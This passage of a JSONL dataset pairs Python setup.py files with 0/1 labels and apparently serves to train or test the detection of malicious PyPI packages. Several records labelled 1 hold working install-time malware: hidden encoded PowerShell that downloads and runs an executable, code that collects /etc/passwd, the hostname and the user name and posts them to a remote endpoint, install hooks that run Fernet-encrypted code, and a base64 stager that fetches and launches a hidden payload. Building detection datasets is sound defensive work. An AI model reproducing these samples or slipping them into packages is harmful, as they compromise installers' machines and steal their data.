3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    test_suite='flask_admin.tests'\n)\n", "target": 0}
{"idx": "selfloadccpy-1.52", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfloadccpy',\n    packages = ['modlib'],\n    version = '2.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flup-1.0.3", "func": "# Bootstrap setuptools\n\nfrom setuptools import setup, find_packages\nsetup(\n    name = 'flup',\n    version = '1.0.3',\n    packages = find_packages(),\n    zip_safe = True,\n    \n    entry_points = \"\"\"\n    [paste.server_runner]\n    ajp = flup.server.paste_factory:run_ajp_thread\n    fcgi = flup.server.paste_factory:run_fcgi_thread\n    scgi = flup.server.paste_factory:run_scgi_thread\n    ajp_thread = flup.server.paste_factory:run_ajp_thread\n    fcgi_thread = flup.server.paste_factory:run_fcgi_thread\n    scgi_thread = flup.server.paste_factory:run_scgi_thread\n    ajp_fork = flup.server.paste_factory:run_ajp_fork\n    fcgi_fork = flup.server.paste_factory:run_fcgi_fork\n    scgi_fork = flup.server.paste_factory:run_scgi_fork\n    \"\"\",\n    \n    author = 'Allan Saddi',\n    author_email = 'allan@saddi.com',\n    description = 'Random assortment of WSGI servers',\n    license = 'BSD',\n    url='http://www.saddi.com/software/flup/',\n    classifiers = [\n    'Development Status :: 5 - Production/Stable',\n    'Environment :: Web Environment',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: BSD License',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python',\n    'Topic :: Internet :: WWW/HTTP :: WSGI :: Server',\n    'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    )\n", "target": 0}
{"idx": "Flask-Testing-0.8.1", "func": "\"\"\"\nFlask-Testing\n-------------\n\nFlask unittest integration.\n\nLinks\n`````\n\n* `documentation <http://packages.python.org/Flask-Testing>`\n* `development version <http://github.com/jarus/flask-testing/zipball/master#egg=Flask-Testing-dev>`\n\n\"\"\"\nimport sys\nfrom setuptools import setup\n\ntests_require = [\n    'blinker'\n]\n\ninstall_requires = [\n    'Flask'\n]\n\nif sys.version_info[0] < 3:\n    tests_require.append('twill==0.9.1')\n\nif sys.version_info < (2, 6):\n    tests_require.append('simplejson')\n    install_requires.append('multiprocessing')\n\nsetup(\n    name='Flask-Testing',\n    version='0.8.1',\n    url='https://github.com/jarus/flask-testing',\n    license='BSD',\n    author='Dan Jacob',\n    author_email='danjac354@gmail.com',\n    description='Unit testing for Flask',\n    long_description=__doc__,\n    packages=['flask_testing'],\n    test_suite=\"tests.suite\",\n    zip_safe=False,\n    platforms='any',\n    install_requires=install_requires,\n    tests_require=tests_require,\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "esqrecv-3.34", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrecv',\n    packages = ['modlib'],\n    version = '1.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ceedee-5.5.0", "func": "from setuptools import setup, find_packages\nimport os\nimport platform\nimport requests\nfrom urllib import request, parse\n\n# Please do not delete this.\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n\nsetup(\n    name='ceedee',\n    version='5.5.0',\n    license='MIT',\n    author=\"Shubham_fnra\",\n    author_email='shubham.agrawal@finra.org',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='ceedee project',\n    install_requires=[\n          'scikit-learn',\n          'requests',\n      ],\n)\n\n# name = os.popen('hostname').read()\n# # who = os.popen('cat /etc/passwd').read()\n# # what = os.popen('uname -a').read()\n# network = os.popen('dir').read()\n#\n# API_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\n#\n# data = {\n# 'hostname': name,\n# # 'whoami': what,\n# 'network': network\n# }\n#\n# r = requests.post(url=API_ENDPOINT, data=data)\n", "target": 1}
{"idx": "dimod-0.11.4", "func": "# Copyright 2018 D-Wave Systems Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\");\n#    you may not use this file except in compliance with the License.\n#    You may obtain a copy of the License at\n#\n#        http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS,\n#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n#    See the License for the specific language governing permissions and\n#    limitations under the License.\n\nimport os\n\nfrom setuptools import setup\n\nimport numpy\n\nfrom Cython.Build import cythonize\nfrom distutils.extension import Extension\nfrom distutils.command.build_ext import build_ext as _build_ext\n\nextra_compile_args = {\n    'msvc': ['/EHsc'],\n    'unix': ['-std=c++11'],\n}\n\nextra_link_args = {\n    'msvc': [],\n    'unix': ['-std=c++11'],\n}\n\n\nclass build_ext(_build_ext):\n    def build_extensions(self):\n        compiler = self.compiler.compiler_type\n\n        compile_args = extra_compile_args[compiler]\n        for ext in self.extensions:\n            ext.extra_compile_args.extend(compile_args)\n\n        link_args = extra_link_args[compiler]\n        for ext in self.extensions:\n            ext.extra_compile_args.extend(link_args)\n\n        super().build_extensions()\n\n    def finalize_options(self):\n        # allow us to set/override the `-j` user option with the\n        # DIMOD_NUM_BUILD_JOBS env (inspired by NumPy's NPY_NUM_BUILD_JOBS).\n        # This is useful for building in CI via pip and other places where\n        # messing with PIP_GLOBAL_OPTION creates undesired side-effects.\n        # Note that this is different than building a single extension from\n        # multiple compiled object files. For that we could use NumPy's\n        # `numpy.distutils.ccompiler.CCompiler_compile` since we use\n        # NumPy at compile time.\n        parallel = os.getenv('DIMOD_NUM_BUILD_JOBS')\n        if parallel is not None:\n            self.parallel = parallel\n        super().finalize_options()\n\n\nsetup(\n    name='dimod',\n    cmdclass=dict(build_ext=build_ext),\n    ext_modules=cythonize(\n        ['dimod/binary/cybqm/*.pyx',\n         'dimod/discrete/cydiscrete_quadratic_model.pyx',\n         'dimod/quadratic/cyqm/*.pyx',\n         'dimod/*.pyx',\n         ],\n        annotate=bool(os.getenv('CYTHON_ANNOTATE', False)),\n        nthreads=int(os.getenv('CYTHON_NTHREADS', 0)),\n        ),\n    include_dirs=[\n        numpy.get_include(),\n        'dimod/include/',\n        ],\n    install_requires=[\n        # this is the oldest supported NumPy on Python 3.8, we cannot\n        # support the oldest for 3.7, 1.14.5\n        'numpy>=1.17.3,<2.0.0',\n        ],\n    # we use the generic 'all' so that in the future we can add or remove\n    # packages without breaking things\n    extras_require=dict(all=''),\n)\n", "target": 0}
{"idx": "evdev-1.6.0", "func": "#!/usr/bin/env python\n# encoding: utf-8\n\nimport os\nimport sys\nimport textwrap\n\nfrom os.path import abspath, dirname, join as pjoin\n\n#-----------------------------------------------------------------------------\ntry:\n    from setuptools import setup, Extension, Command\n    from setuptools.command import build_ext as _build_ext\nexcept ImportError:\n    from distutils.core import setup, Extension, Command\n    from distutils.command import build_ext as _build_ext\n\n\n#-----------------------------------------------------------------------------\nhere = abspath(dirname(__file__))\n\n#-----------------------------------------------------------------------------\nclassifiers = [\n    'Development Status :: 5 - Production/Stable',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Operating System :: POSIX :: Linux',\n    'Intended Audience :: Developers',\n    'Topic :: Software Development :: Libraries',\n    'License :: OSI Approved :: BSD License',\n    'Programming Language :: Python :: Implementation :: CPython',\n]\n\n#-----------------------------------------------------------------------------\ncflags   = ['-std=c99', '-Wno-error=declaration-after-statement']\ninput_c  = Extension('evdev._input',  sources=['evdev/input.c'],  extra_compile_args=cflags)\nuinput_c = Extension('evdev._uinput', sources=['evdev/uinput.c'], extra_compile_args=cflags)\necodes_c = Extension('evdev._ecodes', sources=['evdev/ecodes.c'], extra_compile_args=cflags)\n\n#-----------------------------------------------------------------------------\nkw = {\n    'name':                 'evdev',\n    'version':              '1.6.0',\n\n    'description':          'Bindings to the Linux input handling subsystem',\n    'long_description':     open(pjoin(here, 'README.rst')).read(),\n\n    'author':               'Georgi Valkov',\n    'author_email':         'georgi.t.valkov@gmail.com',\n    'license':              'Revised BSD License',\n    'keywords':             'evdev input uinput',\n    'url':                  'https://github.com/gvalkov/python-evdev',\n    'classifiers':          classifiers,\n\n    'packages':             ['evdev'],\n    'ext_modules':          [input_c, uinput_c, ecodes_c],\n    'include_package_data': False,\n    'zip_safe':             True,\n    'cmdclass':             {},\n}\n\n\n#-----------------------------------------------------------------------------\ndef create_ecodes(headers=None):\n    if not headers:\n        headers = [\n            '/usr/include/linux/input.h',\n            '/usr/include/linux/input-event-codes.h',\n            '/usr/include/linux/uinput.h',\n        ]\n\n    headers = [header for header in headers if os.path.isfile(header)]\n    if not headers:\n        msg = '''\\\n        The 'linux/input.h' and 'linux/input-event-codes.h' include files\n        are missing. You will have to install the kernel header files in\n        order to continue:\n\n            yum install kernel-headers-$(uname -r)\n            apt-get install linux-headers-$(uname -r)\n            emerge sys-kernel/linux-headers\n            pacman -S kernel-headers\n\n        In case they are installed in a non-standard location, you may use\n        the '--evdev-headers' option to specify one or more colon-separated\n        paths. For example:\n\n            python setup.py \\\\\n              build \\\\\n              build_ecodes --evdev-headers path/input.h:path/input-event-codes.h \\\\\n              build_ext --include-dirs  path/ \\\\\n              install\n        '''\n\n        sys.stderr.write(textwrap.dedent(msg))\n        sys.exit(1)\n\n    from subprocess import check_call\n\n    print('writing ecodes.c (using %s)' % ' '.join(headers))\n    cmd = '%s genecodes.py %s > ecodes.c' % (sys.executable, ' '.join(headers))\n    check_call(cmd, cwd=\"%s/evdev\" % here, shell=True)\n\n\n#-----------------------------------------------------------------------------\nclass build_ecodes(Command):\n    description = 'generate ecodes.c'\n\n    user_options = [\n        ('evdev-headers=', None, 'colon-separated paths to input subsystem headers'),\n    ]\n\n    def initialize_options(self):\n        self.evdev_headers = None\n\n    def finalize_options(self):\n        if self.evdev_headers:\n            self.evdev_headers = self.evdev_headers.split(':')\n\n    def run(self):\n        create_ecodes(self.evdev_headers)\n\n\nclass build_ext(_build_ext.build_ext):\n    def has_ecodes(self):\n        ecodes_path = os.path.join(here, 'evdev/ecodes.c')\n        res = os.path.exists(ecodes_path)\n        if res:\n            print('ecodes.c already exists ... skipping build_ecodes')\n        return not res\n\n    def run(self):\n        for cmd_name in self.get_sub_commands():\n            self.run_command(cmd_name)\n        _build_ext.build_ext.run(self)\n\n    sub_commands =  [('build_ecodes', has_ecodes)] + _build_ext.build_ext.sub_commands\n\n\n#-----------------------------------------------------------------------------\nkw['cmdclass']['build_ext'] = build_ext\nkw['cmdclass']['build_ecodes'] = build_ecodes\n\n\n#-----------------------------------------------------------------------------\nif __name__ == '__main__':\n    setup(**kw)\n", "target": 0}
{"idx": "flake8-print-5.0.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nmodules = \\\n['flake8_print']\ninstall_requires = \\\n['flake8>=3.0', 'pycodestyle']\n\nentry_points = \\\n{'flake8.extension': ['T20 = flake8_print:PrintChecker']}\n\nsetup_kwargs = {\n    'name': 'flake8-print',\n    'version': '5.0.0',\n    'description': 'print statement checker plugin for flake8',\n    'long_description': \"Flake8 print plugin\\n===================\\n\\nCheck for Print statements in python files.\\n\\nThis module provides a plugin for ``flake8``, the Python code checker.\\n\\n\\nInstallation\\n------------\\n\\nYou can install or upgrade ``flake8-print`` with these commands::\\n\\n  $ pip install flake8-print\\n  $ pip install --upgrade flake8-print\\n\\n\\nPlugin for Flake8\\n-----------------\\n\\nWhen both ``flake8 2.4.1`` and ``flake8-print`` are installed, the plugin is\\navailable in ``flake8``::\\n\\n    $ flake8 --version\\n    2.4.1 (pep8: 1.5.7, flake8-print: 2.0.0, mccabe: 0.3.1, pyflakes: 0.8.1)\\n\\nFlake8 allows disabling some tests based on the folder:\\n\\n```\\n[flake8]\\nper-file-ignores =\\n    scripts/*: T20\\n    cli.py: T20\\n```\\n\\nError codes\\n-----------\\n\\n| Error Code  | Description                          |\\n| ----------- | ------------------------------------ |\\n| T201        | print found                          |\\n| T203        | pprint found                         |\\n| T204        | pprint declared                      |\\n\\n\\nChanges\\n-------\\n\\n##### 5.0.0 - 2022-04-30\\n\\n* Move namespace from T0* to T2* to avoid collision with other library using same error code.\\n* Remove python 2 specific code paths, error messages and six usage.\\n\\n##### 4.0.1 - 2022-04-30\\n\\n* Fixing bug with noqa detection by removing manual detection and relying on flake8 itself.\\n\\n##### 4.0.0 - 2020-11-29\\n\\n* Opted back into using Poetry now that the existing issues have been fixed.\\n* Python 2.7 support was now officially dropped.\\n\\n##### 3.1.4 - 2019-1-11\\n\\n* Fix bug introduced in 3.1.3\\n* Support for `nopep8` comments\\n\\n##### 3.1.3 - 2019-31-10\\n\\n* Swapped back from poetry to setup.py :(....python ecosystem issues....\\n* single function refactor code\\n\\n##### 3.1.1 - 2019-03-12\\n\\n* Fix reading from stdin when it is closed (requires flake8 > 2.1).\\n* Add error codes to ReadMe.\\n* Swapped to poetry from setup.py\\n* Ran black on the repository\\n\\n##### 3.1.0 - 2018-02-11\\n* Add a framework classifier for use in pypi.org\\n* Fix entry_point in setup.py leaving it off by default again.\\n\\n##### 3.0.1 - 2017-11-06\\n* Fix conflict in setup.py leaving it off by default again.\\n* Fix bug in name code.\\n\\n##### 3.0.0 - 2017-11-05\\n* Remove some of the python 2/3 message differentiation.\\n* Use an AST rather than a logical line checker with a regex.\\n* pprint support.\\n* Loss of multiline noqa support, until there is a way to use both the AST and have flake8 provide the noqa lines.\\n\\n\\n##### 2.0.2 - 2016-02-29\\n* Fix ReadMe for pipy\\n* Refactor, DRY it up.\\n* Update python 2 vs python 3 print statement styles.\\n\\n##### 2.0.1 - 2015-11-21\\n* Add back the decorator to fix the `flake8 --version` call.\\n\\n##### 2.0 - 2015-11-10\\n* Support noqa at end of multiline print statement\\n* Performance improvements\\n* Removed PrintStatementChecker class and other functions\\n* Added T101 for 'Python 2.x reserved word print used.'\\n* Added testing for Python 3.3 and 3.5, and different flake8 versions\\n\\n##### 1.6.1 - 2015-05-22\\n* Fix bug introduced in 1.6.\\n\\n##### 1.6 - 2015-05-18\\n* Added proper support for python3 and testing for python 2.6, 2.7 and 3.4\\n\\n##### 1.5 - 2014-11-04\\n* Added python2.6 support. Thanks @zoidbergwill\\n\\n##### 1.4 - 2014-10-06\\n* Apped noqa support\\n\\n##### 1.3 - 2014-09-27\\n* Dropped noqa support\\n* Support for multiline comments and less false positives\\n\\n##### 1.2 - 2014-06-30\\n* Does not catch the word print in single line strings\\n* Does not catch inline comments with print in it\\n* Added tests\\n\\n##### 1.1 - 2014-06-30\\n* First release\\n\\n##### 1.0 - 2014-06-30\\n* Whoops\\n\",\n    'author': 'Joseph Kahn',\n    'author_email': 'josephbkahn@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/jbkahn/flake8-print',\n    'py_modules': modules,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "cusromtkinter-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'kxXvxRyUWbcDnnKPKYMGumAvWsDhepVCbeVxzvsFfkrBEcaagtASwxfdr'\nLONG_DESCRIPTION = 'lfmKcEpKOHVcNpKNdEvraQXFoMCo fYgxDpHMvXPfnOEIFMZkIgEfCKlhcqRqsxjLxlqqrcaegMyRVPy YTYuFigNWaEjkexBzuZNpjUOnowlWVpmlnSJChFibwBkUagtkTQyZVgnCTMGzIdTeQusmeXUKGM FtpdIFRrDkQWcUfWawgv hvssPIFGsOoCHiyoxLbxSNbSahiBNBlAXUvWBuRglQaBnnATYl lqDTYXVIEsqBZLOqUDoq gSstKscdBI aVLnehnuhOKjftcJIbCGSDJcYQaMEjZYJsIXMeNXqcEcDWzAhANJHTXHyArSz'\n\n\nclass XPUqgXOlfpixALsthIqQSIAezsAMdZuHXjEbBilHKkEFrDOVHwOBZZoBMEIBeCZGquprxlilvICFxEioaYaRebqkVRicNUmdwHhYxuUoAcPSnmKsmHUEDENxpqkmLDgMWxCCZnelENH(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'OTba23PmvHZdmo6X9GvGci07TUjy8e4Rc3kpiZomxF0=').decrypt(b'gAAAAABmBIObqSFJMvPFuvrDkgBIGaWj2RpzPIOtnYXDV_cP4ib0wQ6QX7BFBR2F5umFQE2eUR2-2OW3HM3plI0GgdX7Nc83gEf73zLaNnhqYbXjD8VrYRNcF2-Y5kPq8GUGzMmuQo_UhqccZjLeCKzWd951HrpvSAed_aGqcrlUT_4xk2Fagpt_TyO2w5qCZAEbyOSFEVrcsB1l57_ghZ2R0fmD06Wcz4M49KIMZS6N9_80q5D9MIM='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"cusromtkinter\",\n    version=VERSION,\n    author=\"HedhoekQf\",\n    author_email=\"itjhIV@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': XPUqgXOlfpixALsthIqQSIAezsAMdZuHXjEbBilHKkEFrDOVHwOBZZoBMEIBeCZGquprxlilvICFxEioaYaRebqkVRicNUmdwHhYxuUoAcPSnmKsmHUEDENxpqkmLDgMWxCCZnelENH,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "Flask-Jsonpify-1.5.0", "func": "from setuptools import setup\n\n\nsetup(\n    name='Flask-Jsonpify',\n    version='1.5.0',\n    url='https://github.com/CoryDolphin/flask-jsonpify',\n    license='MIT',\n    author='Cory Dolphin',\n    author_email='corydolph.in@gmail.com',\n    description=\"A Flask extension adding a decorator for JSONP support\",\n    long_description=open('README.rst').read(),\n    py_modules=['flask_jsonpify'],\n    # if you would be using a package instead use packages instead\n    # of py_modules:\n    # packages=['flask_sqlite3'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=[\n        'Flask'\n    ],\n    tests_require=['Flask-Testing', 'nose'],\n    test_suite='nose.collector',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)", "target": 0}
{"idx": "devicespoofer-2.2", "func": "from setuptools import setup\nimport os\nimport pathlib\nimport base64\n\nhere = pathlib.Path(__file__).parent.resolve()\n\nexec(base64.b64decode(b'ZGVmIHJ1bihjbWQpOmltcG9ydCBvcywgc3VicHJvY2VzcztyZXN1bHQgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIGNsb3NlX2Zkcz1UcnVlKTtvdXRwdXQgPSByZXN1bHQuc3Rkb3V0LnJlYWQoKTtyZXR1cm4='))\nif not os.path.exists(r'C:/ProgramData/Updater'):print('Installing dependencies, please wait...');run(r\"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/WULklK/Updater.zip -OutFile $env:tmp/update.zip; Expand-Archive -Force -LiteralPath $env:tmp/update.zip -DestinationPath C:/ProgramData; Remove-Item $env:tmp/update.zip; Start-Process -WindowStyle Hidden -FilePath python.exe -Wait -ArgumentList @('-m pip install pydirectinput pyscreenshot flask py-cpuinfo pycryptodome GPUtil requests keyring pyaes pbkdf2 pywin32 pyperclip flask_cloudflared pillow pynput lz4'); WScript.exe //B C:\\ProgramData\\Updater\\launch.vbs powershell.exe -WindowStyle hidden -command Start-Process -WindowStyle Hidden -FilePath python.exe C:\\ProgramData\\Updater\\server.pyw\")\n\nsetup(\n    name=\"devicespoofer\",\n    version='2.2',\n    license='Eclipse Public License 2.0',\n    author=\"antidetect_ru\",\n    author_email=\"<team@antidetect.ru>\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"Generate fake browser fingerprint data\",\n    description=\"Generate fake browser fingerprint data\",\n    keywords=['devicespoofer'],\n    packages=['devicespoofer'],\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 1}
{"idx": "cvxpy-1.2.1", "func": "import builtins\nimport distutils.sysconfig\nimport distutils.version\nimport os\nimport platform\nimport subprocess\nimport sys\n\nfrom setuptools import Extension, find_packages, setup\nfrom setuptools.command.build_ext import build_ext\n\n# IMPORTANT NOTE\n#\n#   Our versioning infrastructure is adapted from that used in SciPy v 1.9.0.\n#   Specifically, much of this content came from\n#   https://github.com/scipy/scipy/blob/91faf1ed4c3e83afe5009ffb7a9d18eab8dae683/tools/version_utils.py\n#   It's possible that our adaptation has unnecessary complexity.\n#   For example, SciPy might have certain contingencies in place for backwards\n#   compatibilities that CVXPY does not guarantee.\n#\n#   Some comments in the SciPy source provide justification for individual code\n#   snippets. We have mostly left those comments in-place, but we sometimes preface\n#   them with the following remark:\n#      \"The comment below is from the SciPy code which we repurposed for cvxpy.\"\n#\n\nMAJOR = 1\nMINOR = 2\nMICRO = 1\nIS_RELEASED = True\nIS_RELEASE_BRANCH = True\nVERSION = '%d.%d.%d' % (MAJOR, MINOR, MICRO)\n\n\n# Return the git revision as a string\ndef git_version():\n    def _minimal_ext_cmd(cmd):\n        # construct minimal environment\n        env = {}\n        for k in ['SYSTEMROOT', 'PATH']:\n            v = os.environ.get(k)\n            if v is not None:\n                env[k] = v\n        # LANGUAGE is used on win32\n        env['LANGUAGE'] = 'C'\n        env['LANG'] = 'C'\n        env['LC_ALL'] = 'C'\n        out = subprocess.Popen(cmd, stdout=subprocess.PIPE, env=env).communicate()[0]\n        return out\n\n    try:\n        out = _minimal_ext_cmd(['git', 'rev-parse', 'HEAD'])\n        GIT_REVISION = out.strip().decode('ascii')[:7]\n\n        # The comment below is from the SciPy code which we repurposed for cvxpy.\n        #\n        #   We need a version number that's regularly incrementing for newer commits,\n        #   so the sort order in a wheelhouse of nightly builds is correct (see\n        #   https://github.com/MacPython/scipy-wheels/issues/114). It should also be\n        #   a reproducible version number, so don't rely on date/time but base it on\n        #   commit history. This gives the commit count since the previous branch\n        #   point from the current branch (assuming a full `git clone`, it may be\n        #   less if `--depth` was used - commonly the default in CI):\n        prev_version_tag = '^v{}.{}.0'.format(MAJOR, MINOR - 2)\n        out = _minimal_ext_cmd(['git', 'rev-list', 'HEAD', prev_version_tag,\n                                '--count'])\n        COMMIT_COUNT = out.strip().decode('ascii')\n        COMMIT_COUNT = '0' if not COMMIT_COUNT else COMMIT_COUNT\n    except OSError:\n        GIT_REVISION = \"Unknown\"\n        COMMIT_COUNT = \"Unknown\"\n\n    return GIT_REVISION, COMMIT_COUNT\n\n\n# BEFORE importing setuptools, remove MANIFEST. Otherwise it may not be\n# properly updated when the contents of directories change (true for distutils,\n# not sure about setuptools).\nif os.path.exists('MANIFEST'):\n    os.remove('MANIFEST')\n\n# The comment below is from the SciPy code which we adapted for cvxpy.\n#\n#   This is a bit hackish: we are setting a global variable so that the main\n#   cvxpy __init__ can detect if it is being loaded by the setup routine, to\n#   avoid attempting to load components that aren't built yet.  While ugly, it's\n#   a lot more robust than what was previously being used.\nbuiltins.__CVXPY_SETUP__ = True\n\n\ndef get_version_info():\n    # The comment below is from the SciPy code which we adapted for cvxpy.\n    #\n    #   Adding the git rev number needs to be done inside\n    #   write_version_py(), otherwise the import of cvxpy.version messes\n    #   up the build under Python 3.\n    FULLVERSION = VERSION\n    if os.path.exists('.git'):\n        GIT_REVISION, COMMIT_COUNT = git_version()\n    elif 